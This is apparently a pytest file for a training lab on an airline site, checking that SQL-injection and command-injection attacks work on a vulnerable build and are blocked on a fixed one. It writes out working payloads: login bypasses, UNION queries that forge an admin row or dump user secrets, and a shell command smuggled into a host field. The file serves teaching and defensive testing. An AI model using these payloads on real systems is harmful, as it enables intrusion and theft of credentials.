"""A05 Injection: every exploit from SOLUTION.md must work on ``vulnerable``
and must be blocked on ``fixed``, while normal use keeps working on both.

The lab is the Skyline airline site: SQL injection in the login and the
flight search, command injection in the admin airport-node check.
"""
from conftest import make_client_fixture

LAB = "A05-injection"

vuln = make_client_fixture(LAB, "vulnerable")
fixed = make_client_fixture(LAB, "fixed")

FLAG_LOGIN = "FLAG{a05_sqli_login_bypass}"
FLAG_HIDDEN = "FLAG{a05_hidden_flight}"
FLAG_UNION = "FLAG{a05_sqli_union_dump}"
FLAG_CMD = "FLAG{a05_command_injection}"

# UNION in the login field forges a whole row (username, role, secret) and so
# also defeats a password check done in Python. Only parameterized queries stop it.
FORGED_ADMIN = "x' UNION SELECT 'admin', 'admin', 'pw' --"

# The search returns 7 columns: id, flight_no, origin, destination,
# dep_date, dep_time, price — UNION must match exactly.
UNION_USERS = ("' UNION SELECT id, username, 'X', secret, "
               "'2026-11-14', '00:00', 0 FROM users --")


def login(client, username, password):
    return client.post("/login", json={"username": username, "password": password})


# --------------------------------------------------------------------------
# vulnerable: the flaws are really there
# --------------------------------------------------------------------------
class TestVulnerable:
    def test_normal_login_works(self, vuln):
        r = login(vuln, "alice", "alice123")
        assert r.status_code == 200
        assert r.get_json()["user"] == "alice"

    def test_wrong_password_rejected(self, vuln):
        assert login(vuln, "alice", "wrong").status_code == 401

    def test_normal_search_works(self, vuln):
        r = vuln.get("/flights", query_string={"from": "TAS", "to": "IST"})
        assert r.status_code == 200
        assert [f["flight_no"] for f in r.get_json()] == ["SK 104"]

    def test_login_bypass_with_comment(self, vuln):
        r = login(vuln, "admin'--", "x")
        assert r.status_code == 200
        assert r.get_json()["flag"] == FLAG_LOGIN

    def test_login_bypass_with_or_true(self, vuln):
        r = login(vuln, "nobody' OR '1'='1' --", "x")
        assert r.status_code == 200

    def test_login_union_forges_admin_row(self, vuln):
        r = login(vuln, FORGED_ADMIN, "pw")
        assert r.status_code == 200
        assert r.get_json()["role"] == "admin"

    def test_hidden_charter_leaks(self, vuln):
        r = vuln.get("/flights", query_string={"from": "", "to": "%' OR 1=1 --"})
        charter = [f for f in r.get_json() if f["flight_no"] == "SK 900"]
        assert charter, "the hidden charter flight must appear in the results"
        detail = vuln.get(f"/flight/{charter[0]['id']}")
        assert FLAG_HIDDEN in detail.get_data(as_text=True)

    def test_union_dumps_users_table(self, vuln):
        r = vuln.get("/flights", query_string={"from": "", "to": UNION_USERS})
        rows = r.get_json()
        assert any(row["flight_no"] == "admin" and row["destination"] == FLAG_UNION
                   for row in rows)

    def test_sql_error_text_is_exposed(self, vuln):
        r = vuln.get("/flights", query_string={"from": "TAS", "max_price": "abc"})
        assert r.status_code == 500
        assert "no such column" in r.get_json()["error"]

    def test_command_injection_reads_flag(self, vuln):
        login(vuln, "admin'--", "x")
        r = vuln.post("/admin/check",
                      json={"host": "localhost; echo $A05_FLAG"})
        assert r.status_code == 200
        assert FLAG_CMD in r.get_json()["output"]

    def test_no_csp_header(self, vuln):
        assert "Content-Security-Policy" not in vuln.get("/flights?from=TAS").headers


# --------------------------------------------------------------------------
# fixed: the same attacks no longer work, normal scenarios still do
# --------------------------------------------------------------------------
class TestFixed:
    def test_normal_login_works(self, fixed):
        r = login(fixed, "alice", "alice123")
        assert r.status_code == 200
        assert r.get_json()["user"] == "alice"

    def test_admin_with_real_password_still_gets_flag(self, fixed):
        r = login(fixed, "admin", "Adm1n-lab-pass")
        assert r.status_code == 200
        assert r.get_json()["flag"] == FLAG_LOGIN

    def test_wrong_password_rejected(self, fixed):
        assert login(fixed, "alice", "wrong").status_code == 401

    def test_login_bypass_blocked(self, fixed):
        for payload in ("admin'--", "nobody' OR '1'='1' --"):
            r = login(fixed, payload, "x")
            assert r.status_code == 401, payload
            assert FLAG_LOGIN not in r.get_data(as_text=True)

    def test_login_union_forged_row_blocked(self, fixed):
        r = login(fixed, FORGED_ADMIN, "pw")
        assert r.status_code == 401
        assert FLAG_LOGIN not in r.get_data(as_text=True)

    def test_search_still_works(self, fixed):
        r = fixed.get("/flights", query_string={"from": "TAS", "to": "IST"})
        assert r.status_code == 200
        assert [f["flight_no"] for f in r.get_json()] == ["SK 104"]

    def test_hidden_charter_not_leaked(self, fixed):
        r = fixed.get("/flights", query_string={"from": "", "to": "%' OR 1=1 --"})
        assert r.status_code == 200
        body = r.get_data(as_text=True)
        assert "SK 900" not in body
        assert FLAG_HIDDEN not in body

    def test_union_returns_nothing(self, fixed):
        r = fixed.get("/flights", query_string={"from": "", "to": UNION_USERS})
        assert r.get_json() == []
        assert FLAG_UNION not in r.get_data(as_text=True)

    def test_quote_does_not_cause_sql_error(self, fixed):
        r = fixed.get("/flights", query_string={"from": "TAS", "max_price": "'"})
        assert r.status_code == 200
        assert isinstance(r.get_json(), list)

    def test_csp_forbids_scripts_on_content_pages(self, fixed):
        csp = fixed.get("/flights?from=TAS").headers["Content-Security-Policy"]
        assert "default-src 'none'" in csp
        assert "script-src" not in csp

    def test_admin_check_rejects_shell_syntax(self, fixed):
        login(fixed, "admin", "Adm1n-lab-pass")
        r = fixed.post("/admin/check", json={"host": "localhost; echo $A05_FLAG"})
        out = r.get_json()["output"]
        assert "invalid host" in out
        assert FLAG_CMD not in out

    def test_admin_check_resolves_normal_host(self, fixed):
        login(fixed, "admin", "Adm1n-lab-pass")
        r = fixed.post("/admin/check", json={"host": "localhost"})
        assert "->" in r.get_json()["output"]

    def test_host_length_and_format_limited(self, fixed):
        login(fixed, "admin", "Adm1n-lab-pass")
        r = fixed.post("/admin/check", json={"host": "a" * 300})
        assert "invalid host" in r.get_json()["output"]
